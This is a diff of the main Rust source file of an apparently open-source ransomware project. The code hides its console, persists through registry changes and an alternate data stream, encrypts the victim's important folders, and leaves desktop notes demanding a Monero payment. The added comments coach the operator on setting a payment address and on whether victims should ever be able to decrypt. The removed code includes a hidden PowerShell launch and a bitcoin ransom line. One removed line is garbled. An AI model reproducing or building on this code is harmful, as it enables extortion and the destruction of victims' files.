@@ -1,91 +1,32 @@
 #![windows_subsystem = "windows"] // hides execution console
-mod encryption;
-mod smart_dir;
-mod system_changer;
-use aes_gcm_siv::aead::generic_array::typenum::Len;
-use aes_gcm_siv::aead::{Aead, NewAead};
-use aes_gcm_siv::{Aes128GcmSiv, Aes256GcmSiv, Key, Nonce};
-use dirs;
+mod encryption; // the module with all the encryption stuff
+mod smart_dir; // the module for getting dir list sorted in order of importance.
+mod system_changer; // the module for changing registry keys and adding the program to startup
 use encryption::encryptor;
 use encryption::key_gen;
-use fs_extra;
 use mountpoints;
-use mslnk::ShellLink;
 use rand::prelude::*;
 use rand_hc::Hc128Rng;
 use smart_dir::dir_list;
-use std::collections::{HashMap, HashSet};
 use std::fs;
-use std::io;
-use std::path;
-use std::path::Path;
-use std::process::{Command, Stdio};
-use std::str;
+use std::process::Command;
 use std::thread;
 use std::time;
-use sysinfo::{NetworkExt, NetworksExt, ProcessExt, RefreshKind, System, SystemExt};
 use system_changer::registry_changer;
-use walkdir::WalkDir;
-
-// powershell -command "(expand path_to_stream path_to_output) -and (.\path_to_output)"
-// leave the file where it was extracted.
-// try make the few current user registry changes in the local machine if possible
-// check notes if there are still any critical changes for stability to be done
-// afterwards move on to filling the desktop with files about how to get the data back.
 
 fn main() {
-    /*
-    let exec_name = match registry_changer::get_exec_name() {
-        Some(name) => name,
-        None => return,
-    };
-
-    println!("Exec name: {}", &exec_name);
-
-    // Copy the program to a different path
-    match dir_list::get_home_dir() {
-        Some(dir) => {
-            let destination = dir.clone() + "\\AppData\\Roaming\\rustsomware\\";
-            let target = dir.clone() + "\\AppData\\Roaming\\rustsomware\\rustsomware.exe";
-            let lnk = target.clone() + ".lnk";
-            fs::create_dir(&destination);
-            fs::copy(&exec_name, &target).unwrap();
-            println!("Fully copied exe.")
-        }
-        None => println!("No dir with home dir data!"),
-    }
-
-    println!("Finished prograchris titus tech
-        "C:\\Users\\Administrator\\Desktop\\OpenMeInNotepad.rustsw",
-        "In order to receive decryption key and instructions send bitcoin here: XXdfsfAHJflh39",
-    );*/
-    /*
-    registry_changer::start_ransomware_on_startup_alternate_data_stream();
-
-    let command =
-        format!("wmic process call create '\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\"'");
-    Command::new("cmd")
-        .args([
-            "/c",
-            "start",
-            "/min",
-            "cmd",
-            "/c",
-            "powershell",
-            "-WindowStyle",
-            "Hidden",
-            "-NonInteractive",
-            "-NoLogo",
-            "-Command",
-            &command,
-        ])
-        .spawn();*/
-
+    // Global vars used in the bellow code, CHANGE BEFORE COMPILING AS THEY ARE SUPPOSED TO BE UNIQUE.
+    // Note that if you want to make the ransomware more unique and harder to be removed you should go in other files and change other settings
+    // A guide in the README.md on how to make this more random and secure should be coming soon.
+    // the amount of money you want to request
     let money_amount = "234.23";
+    // your monero address, this is mine if you are wondering
     let my_monero_addr = "45rzJThpy7aX5VNtPxoSUJaRySFHBWT4ZLL2nWafKj6XgvUiQjfKGLT77wuqrja8KW9tawSrStWArMqZwcNk2JZ7748s9yZ";
+    // true means using the alternate data stream method, false means using the legacy method of placing the exe somewhere in AppData and adding that to the registry.
+    // refer to the README.md or the patch notes on version v0.5.0-alpha.
     let use_alternate_data_stream = true;
 
-    // Adds program to startup
+    // Adds program to startup based on what the boolean is set to.
     if use_alternate_data_stream {
         registry_changer::start_ransomware_on_startup_alternate_data_stream();
     } else {
@@ -101,6 +42,9 @@ fn main() {
     dir_list::add_non_valuable_folder_paths_windows(&mut unwanted_folders);
 
     // Creates an encryptor from strong generated keys.
+    // Note, usually the ransomware viruses are made so that the victim can't actually decrypt their files and that the keys are random,
+    // but if you want to make them decrypt-able you should make a decryptor as there I didn't make one yet and probably won't and a method to send them the decryptor and the key.
+    // This could be useful into luring in more people to pay, but will also expose you when it comes to sending the decryptor and key and it's hard when you infect a ton of systems.
     let mut key_gen = key_gen::KeyGen::from(Hc128Rng::from_entropy());
     let key_bytes = key_gen.gen_key_bytes_128bits();
     let nonce_bytes = key_gen.gen_nonce_bytes();
@@ -126,12 +70,12 @@ fn main() {
     // Restart explorer.exe in order for registry changes to apply
     restart_explorer();
 
-    // Second encrypts in the vector we got at the start.
+    // Second encrypts in the vector with the important files.
     for path in folders_to_encrypt {
         encryptor.encrypt_dir(&path);
     }
 
-    // After puts a bunch of files on the desktop explaining how the virus works and how to decrypt their files
+    // After, it places a bunch of files on the desktop explaining how the virus works and how to decrypt their files
     system_changer::other::put_files_on_desktop_on_how_to_recover_data(
         my_monero_addr,
         money_amount,
@@ -173,44 +117,11 @@ fn main() {
     restart_explorer();
 
     // HACK keeping window opened for debugging purposes.
-    let mut buf = String::new();
-    std::io::stdin().read_line(&mut buf);
-    /*
-    for path in common_folder_paths {
-        println!("{}", path);
-    }*/
-    /*
-    // Adds pictures folder path to the vec
-    let public_path = match dirs::public_dir() {
-        Some(path) => match path.to_str() {
-            Some(path_str) => path_str.to_owned(),
-            None => String::from(""),
-        },
-        None => String::from(""),
-    };
-
-    for file in WalkDir::new("C:\\Users\\Administrator\\AppData")
-        .into_iter()
-        .filter_map(|file| file.ok())
-    {
-        if file.metadata().unwrap().is_file() {
-            println!("{}", file.path().display());
-        }
-    }*/
-    /*
-
-    let mut sys = System::new_with_specifics(RefreshKind::new().with_disks_list());
-    for disk in sys.disks() {
-        let t = disk.to_owned()
-        println!("{:?}", disk);
-    }*/
-    /*
-    let sys = System::new_all();
-    for disk in sys.disks() {
-        println!("{:?}", disk);
-    }*/
+    // let mut buf = String::new();
+    // std::io::stdin().read_line(&mut buf);
 }
 
+// Simple function that kills the explorer.exe process and opens it back after
 fn restart_explorer() {
     Command::new("taskkill")
         .arg("/f")
